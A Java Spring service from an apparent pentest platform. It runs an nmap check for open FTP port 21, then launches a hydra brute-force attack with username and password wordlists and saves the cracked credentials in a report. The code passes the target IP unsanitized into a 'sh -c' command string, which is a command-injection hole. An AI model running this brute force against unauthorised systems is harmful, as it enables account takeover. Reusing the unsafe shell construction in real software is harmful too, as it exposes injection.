package org.penforge.backend.pentestScenarios;

import lombok.AllArgsConstructor;
import org.penforge.backend.pentestRecon.PentestReconService;
import org.penforge.backend.pentestReport.Credentials;
import org.penforge.backend.pentestReport.PentestReport;
import org.penforge.backend.pentestReport.PentestReportRepository;
import org.penforge.backend.pentestReport.PortData;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
@AllArgsConstructor
public class FtpBruteForceService {

    private final PentestReportRepository pentestReportRepository;

    private final PentestReconService pentestReconService;

    public String isPortOpen(String targetIp, String userId) throws Exception {
        List<PortData> portDataList = pentestReconService.runNmap(targetIp);
        boolean isFtpPortOpen = portDataList.stream().anyMatch(portData -> portData.getPort().equals("21/tcp") && portData.getPortState().equals("open"));

        if (isFtpPortOpen) {
            return performFtpBruteForce(targetIp, userId, portDataList);
        } else {
            throw new IllegalArgumentException("FTP port is not open on target IP");
        }
    }

    public String performFtpBruteForce(String targetIp, String userId, List<PortData> portDataList) {
        List<Credentials> credentialList = new ArrayList<>();
        String usernamesPath = "/home/order6tyfix/usernames.txt";
        String passwordsPath = "/home/order6tyfix/passwords.txt";

        String command = String.format(
                "hydra -L %s -P %s ftp://%s -vV | grep -i '\\[21\\]\\[ftp\\]'",
                usernamesPath, passwordsPath, targetIp
        );

        List<String> commands = Arrays.asList("wsl", "sh", "-c", command);

        ProcessBuilder processBuilder = new ProcessBuilder(commands);
        processBuilder.redirectErrorStream(true);

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(processBuilder.start().getInputStream()))) {
            String line;
            Pattern pattern = Pattern.compile("\\[21\\]\\[ftp\\] host: (\\S+)\\s+login: (\\S+)\\s+password: (\\S+)");
            while ((line = reader.readLine()) != null) {
                Matcher matcher = pattern.matcher(line);
                if (matcher.find()) {
                    credentialList.add(Credentials.builder()
                            .username(matcher.group(2))
                            .password(matcher.group(3))
                            .build());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        PentestReport report = PentestReport.builder()
                .userId(userId)
                .id(UUID.randomUUID().toString())
                .targetIP(targetIp)
                .targetService("ftp")
                .targetPort(21)
                .scanDate(new Date())
                .credentials(credentialList)
                .portData(portDataList)
                .build();

        pentestReportRepository.save(report);

        return report.getId();
    }
}
